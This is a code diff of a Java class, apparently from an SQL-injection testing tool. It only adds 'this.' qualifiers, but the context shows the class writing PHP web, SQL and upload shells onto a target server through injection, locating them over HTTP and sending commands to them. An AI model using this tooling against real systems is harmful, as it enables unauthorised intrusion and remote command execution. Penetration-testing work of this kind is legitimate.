@@ -113,9 +113,9 @@ public class RessourceAccess {
     public RessourceAccess(InjectionModel injectionModel) {
         this.injectionModel = injectionModel;
         
-        FILENAME_WEBSHELL = "..jw.php";
-        FILENAME_SQLSHELL = ".js.php";
-        FILENAME_UPLOAD = ".ju.php";
+        this.FILENAME_WEBSHELL = "..jw.php";
+        this.FILENAME_SQLSHELL = ".js.php";
+        this.FILENAME_UPLOAD = ".ju.php";
         
     }
     
@@ -147,7 +147,7 @@ public class RessourceAccess {
         for (String segment: directoryNames) {
             urlPart.append(segment);
             for (ItemList pageName: pageNames) {
-                taskCompletionService.submit(new CallableHttpHead(urlProtocol + urlPart.toString() + pageName.toString(), injectionModel));
+                taskCompletionService.submit(new CallableHttpHead(urlProtocol + urlPart.toString() + pageName.toString(), this.injectionModel));
             }
         }
 
@@ -209,7 +209,7 @@ public class RessourceAccess {
             return;
         }
         
-        String sourceShellToInject = injectionModel.propertiesUtil.getProperties()
+        String sourceShellToInject = this.injectionModel.propertiesUtil.getProperties()
             .getProperty("shell.web")
             .replace(DataAccess.LEAD_IN_SHELL, DataAccess.LEAD)
             .replace(DataAccess.TRAIL_IN_SHELL, DataAccess.TRAIL);
@@ -219,14 +219,14 @@ public class RessourceAccess {
             pathShellFixed += "/";
         }
         this.injectionModel.injectWithoutIndex(
-            this.injectionModel.getVendor().instance().sqlTextIntoFile(sourceShellToInject, pathShellFixed + FILENAME_WEBSHELL)
+            this.injectionModel.getVendor().instance().sqlTextIntoFile(sourceShellToInject, pathShellFixed + this.FILENAME_WEBSHELL)
         );
 
         String resultInjection;
         String[] sourcePage = {""};
         try {
-            resultInjection = new SuspendableGetRows(injectionModel).run(
-                this.injectionModel.getVendor().instance().sqlFileRead(pathShellFixed + FILENAME_WEBSHELL),
+            resultInjection = new SuspendableGetRows(this.injectionModel).run(
+                this.injectionModel.getVendor().instance().sqlFileRead(pathShellFixed + this.FILENAME_WEBSHELL),
                 sourcePage,
                 false,
                 1,
@@ -246,11 +246,11 @@ public class RessourceAccess {
         
         String url = urlShell;
         if ("".equals(url)) {
-            url = injectionModel.connectionUtil.getUrlBase();
+            url = this.injectionModel.connectionUtil.getUrlBase();
         }
 
         if (resultInjection.indexOf(sourceShellToInject) > -1) {
-            LOGGER.debug("Web payload created into \""+ pathShellFixed + FILENAME_WEBSHELL +"\"");
+            LOGGER.debug("Web payload created into \""+ pathShellFixed + this.FILENAME_WEBSHELL +"\"");
             //
             String urlWithoutProtocol = url.replaceAll("^https?://[^/]*", "");
             
@@ -277,7 +277,7 @@ public class RessourceAccess {
             StringBuilder urlPart = new StringBuilder();
             for (String segment: directoryNames) {
                 urlPart.append(segment);
-                taskCompletionService.submit(new CallableHttpHead(urlProtocol + urlPart.toString() + FILENAME_WEBSHELL, injectionModel));
+                taskCompletionService.submit(new CallableHttpHead(urlProtocol + urlPart.toString() + this.FILENAME_WEBSHELL, this.injectionModel));
             }
 
             int submittedTasks = directoryNames.size() * 1;
@@ -295,8 +295,8 @@ public class RessourceAccess {
                         urlSuccess = currentCallable.getUrl();
 
                         if (
-                            !urlShell.isEmpty() && urlSuccess.replace(FILENAME_WEBSHELL, "").equals(urlShell)
-                            || urlSuccess.replace(FILENAME_WEBSHELL, "").equals(urlProtocol + urlWithoutFileName)
+                            !urlShell.isEmpty() && urlSuccess.replace(this.FILENAME_WEBSHELL, "").equals(urlShell)
+                            || urlSuccess.replace(this.FILENAME_WEBSHELL, "").equals(urlProtocol + urlWithoutFileName)
                         ) {
                             LOGGER.debug("Connection to payload found at expected location \""+ urlSuccess +"\"");
                         } else {
@@ -317,7 +317,7 @@ public class RessourceAccess {
             if (urlSuccess != null) {
                 Request request = new Request();
                 request.setMessage(Interaction.CREATE_SHELL_TAB);
-                request.setParameters(pathShellFixed.replace(FILENAME_WEBSHELL, ""), urlSuccess);
+                request.setParameters(pathShellFixed.replace(this.FILENAME_WEBSHELL, ""), urlSuccess);
                 this.injectionModel.sendToViews(request);
             } else {
                 LOGGER.warn("HTTP connection to Web payload not found");
@@ -338,12 +338,12 @@ public class RessourceAccess {
 
         String url = urlCommand;
         connection = (HttpURLConnection) new URL(url).openConnection();
-        connection.setReadTimeout(injectionModel.connectionUtil.getTimeout());
-        connection.setConnectTimeout(injectionModel.connectionUtil.getTimeout());
+        connection.setReadTimeout(this.injectionModel.connectionUtil.getTimeout());
+        connection.setConnectTimeout(this.injectionModel.connectionUtil.getTimeout());
 
         String pageSource = null;
         try {
-            pageSource = injectionModel.connectionUtil.getSource(connection);
+            pageSource = this.injectionModel.connectionUtil.getSource(connection);
         } catch (Exception e) {
             pageSource = "";
         }
@@ -387,7 +387,7 @@ public class RessourceAccess {
         String result = "";
         
         try {
-            result = runCommandShell(
+            result = this.runCommandShell(
                 urlShell + "?c="+ URLEncoder.encode(command.trim(), "ISO-8859-1")
             );
             
@@ -422,7 +422,7 @@ public class RessourceAccess {
             return;
         }
         
-        String sourceShellToInject = injectionModel.propertiesUtil.getProperties()
+        String sourceShellToInject = this.injectionModel.propertiesUtil.getProperties()
             .getProperty("shell.sql")
             .replace(DataAccess.LEAD_IN_SHELL, DataAccess.LEAD)
             .replace(DataAccess.TRAIL_IN_SHELL, DataAccess.TRAIL);
@@ -432,14 +432,14 @@ public class RessourceAccess {
             pathShellFixed += "/";
         }
         this.injectionModel.injectWithoutIndex(
-            this.injectionModel.getVendor().instance().sqlTextIntoFile(sourceShellToInject, pathShellFixed + FILENAME_SQLSHELL)
+            this.injectionModel.getVendor().instance().sqlTextIntoFile(sourceShellToInject, pathShellFixed + this.FILENAME_SQLSHELL)
         );
 
         String resultInjection;
         String[] sourcePage = {""};
         try {
-            resultInjection = new SuspendableGetRows(injectionModel).run(
-                this.injectionModel.getVendor().instance().sqlFileRead(pathShellFixed + FILENAME_SQLSHELL),
+            resultInjection = new SuspendableGetRows(this.injectionModel).run(
+                this.injectionModel.getVendor().instance().sqlFileRead(pathShellFixed + this.FILENAME_SQLSHELL),
                 sourcePage,
                 false,
                 1,
@@ -459,11 +459,11 @@ public class RessourceAccess {
         
         String url = urlShell;
         if ("".equals(url)) {
-            url = injectionModel.connectionUtil.getUrlBase();
+            url = this.injectionModel.connectionUtil.getUrlBase();
         }
 
         if (resultInjection.indexOf(sourceShellToInject) > -1) {
-            LOGGER.debug("SQL payload created into \""+ pathShellFixed + FILENAME_SQLSHELL +"\"");
+            LOGGER.debug("SQL payload created into \""+ pathShellFixed + this.FILENAME_SQLSHELL +"\"");
             //
             String urlWithoutProtocol = url.replaceAll("^https?://[^/]*", "");
             
@@ -490,7 +490,7 @@ public class RessourceAccess {
             StringBuilder urlPart = new StringBuilder();
             for (String segment: directoryNames) {
                 urlPart.append(segment);
-                taskCompletionService.submit(new CallableHttpHead(urlProtocol + urlPart.toString() + FILENAME_SQLSHELL, injectionModel));
+                taskCompletionService.submit(new CallableHttpHead(urlProtocol + urlPart.toString() + this.FILENAME_SQLSHELL, this.injectionModel));
             }
 
             int submittedTasks = directoryNames.size() * 1;
@@ -508,8 +508,8 @@ public class RessourceAccess {
                         urlSuccess = currentCallable.getUrl();
 
                         if (
-                            !urlShell.isEmpty() && urlSuccess.replace(FILENAME_SQLSHELL, "").equals(urlShell)
-                            || urlSuccess.replace(FILENAME_SQLSHELL, "").equals(urlProtocol + urlWithoutFileName)
+                            !urlShell.isEmpty() && urlSuccess.replace(this.FILENAME_SQLSHELL, "").equals(urlShell)
+                            || urlSuccess.replace(this.FILENAME_SQLSHELL, "").equals(urlProtocol + urlWithoutFileName)
                         ) {
                             LOGGER.debug("Connection to payload found at expected location \""+ urlSuccess +"\"");
                         } else {
@@ -530,7 +530,7 @@ public class RessourceAccess {
             if (urlSuccess != null) {
                 Request request = new Request();
                 request.setMessage(Interaction.CREATE_SQL_SHELL_TAB);
-                request.setParameters(pathShellFixed.replace(FILENAME_SQLSHELL, ""), urlSuccess, username, password);
+                request.setParameters(pathShellFixed.replace(this.FILENAME_SQLSHELL, ""), urlSuccess, username, password);
                 this.injectionModel.sendToViews(request);
             } else {
                 LOGGER.warn("HTTP connection to SQL payload not found");
@@ -551,7 +551,7 @@ public class RessourceAccess {
     public void runSqlShell(String command, UUID uuidShell, String urlShell, String username, String password) {
         String result = "";
         try {
-            result = runCommandShell(
+            result = this.runCommandShell(
                 urlShell + "?q="+ URLEncoder.encode(command.trim(), "ISO-8859-1") +"&u="+ username +"&p="+ password
             );
             
@@ -642,7 +642,7 @@ public class RessourceAccess {
             return;
         }
         
-        String sourceShellToInject = injectionModel.propertiesUtil.getProperties()
+        String sourceShellToInject = this.injectionModel.propertiesUtil.getProperties()
             .getProperty("shell.upload")
             .replace(DataAccess.LEAD_IN_SHELL, DataAccess.LEAD);
         
@@ -652,14 +652,14 @@ public class RessourceAccess {
         }
         
         this.injectionModel.injectWithoutIndex(
-            this.injectionModel.getVendor().instance().sqlTextIntoFile("<"+ DataAccess.LEAD +">"+ sourceShellToInject +"<"+ DataAccess.TRAIL +">", pathShellFixed + FILENAME_UPLOAD)
+            this.injectionModel.getVendor().instance().sqlTextIntoFile("<"+ DataAccess.LEAD +">"+ sourceShellToInject +"<"+ DataAccess.TRAIL +">", pathShellFixed + this.FILENAME_UPLOAD)
         );
 
         String[] sourcePage = {""};
         String sourceShellInjected;
         try {
-            sourceShellInjected = new SuspendableGetRows(injectionModel).run(
-                this.injectionModel.getVendor().instance().sqlFileRead(pathShellFixed + FILENAME_UPLOAD),
+            sourceShellInjected = new SuspendableGetRows(this.injectionModel).run(
+                this.injectionModel.getVendor().instance().sqlFileRead(pathShellFixed + this.FILENAME_UPLOAD),
                 sourcePage,
                 false,
                 1,
@@ -675,15 +675,15 @@ public class RessourceAccess {
 
         String urlFileFixed = urlFile;
         if ("".equals(urlFileFixed)) {
-            urlFileFixed = injectionModel.connectionUtil.getUrlBase().substring(0, injectionModel.connectionUtil.getUrlBase().lastIndexOf('/') + 1);
+            urlFileFixed = this.injectionModel.connectionUtil.getUrlBase().substring(0, this.injectionModel.connectionUtil.getUrlBase().lastIndexOf('/') + 1);
         }
         
         if (sourceShellInjected.indexOf(sourceShellToInject) > -1) {
-            LOGGER.debug("Upload payload deployed at \""+ urlFileFixed + FILENAME_UPLOAD +"\" in \""+ pathShellFixed + FILENAME_UPLOAD +"\"");
+            LOGGER.debug("Upload payload deployed at \""+ urlFileFixed + this.FILENAME_UPLOAD +"\" in \""+ pathShellFixed + this.FILENAME_UPLOAD +"\"");
             
             String crLf = "\r\n";
             
-            URL urlUploadShell = new URL(urlFileFixed +"/"+ FILENAME_UPLOAD);
+            URL urlUploadShell = new URL(urlFileFixed +"/"+ this.FILENAME_UPLOAD);
             URLConnection connection = urlUploadShell.openConnection();
             connection.setDoOutput(true);
             
@@ -785,7 +785,7 @@ public class RessourceAccess {
         
         String[] sourcePage = {""};
 
-        String resultInjection = new SuspendableGetRows(injectionModel).run(
+        String resultInjection = new SuspendableGetRows(this.injectionModel).run(
             this.injectionModel.getVendor().instance().sqlPrivilegeTest(),
             sourcePage,
             false,
@@ -835,7 +835,7 @@ public class RessourceAccess {
         CompletionService<CallableFile> taskCompletionService = new ExecutorCompletionService<>(taskExecutor);
 
         for (ItemList pathFile: pathsFiles) {
-            CallableFile callableFile = new CallableFile(pathFile.toString(), injectionModel);
+            CallableFile callableFile = new CallableFile(pathFile.toString(), this.injectionModel);
             taskCompletionService.submit(callableFile);
             RessourceAccess.callablesReadFile.add(callableFile);
         }
